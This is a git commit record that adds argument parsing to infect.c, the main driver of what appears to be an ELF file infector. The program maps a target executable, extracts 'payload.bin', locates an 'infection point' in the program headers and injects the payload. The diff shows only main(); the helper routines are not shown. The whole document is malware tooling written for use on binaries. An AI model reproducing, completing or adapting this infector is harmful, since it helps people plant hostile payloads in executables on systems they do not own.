4b462e3d88a671129706944e70ca123a57c8b431
H <huatux@users.noreply.github.com>
2022-09-03 19:27:13 +0800

    Create infect.c

--- infect.c
+++ infect.c
@@ -4,19 +4,37 @@
 
 int main(int argc,char **argv)
 {
-	open_map_file(argv[1]);
+        int opt;
+        unsigned char *target_elf = NULL;
 
-	extract_payload("payload.bin");
 
-	int segment = find_phdr();
-	if(segment<0)
-	{
-		printf("unable to find usable infection point\n");
-		exit(EXIT_FAILURE);
-	}
-	
-	infect_host(segment);	
-	
+        while ((opt = getopt(argc, argv, "f:")) != -1) {
+                switch (opt) {
+            case 'f':
+                target_elf = optarg;
+                break;
+                }
+        }
 
-	return 0;
+        if(target_elf == NULL)
+        {
+           printf("Usage:%s -f \"Target ELF file wanted to infect\"\n", argv[0]);
+           return 1;
+        }
+
+        open_map_file(target_elf);
+
+        extract_payload("payload.bin");
+
+        int segment = find_phdr();
+        if(segment<0)
+        {
+                printf("unable to find usable infection point\n");
+                exit(EXIT_FAILURE);
+        }
+
+        infect_host(segment);
+
+
+        return 0;
 }
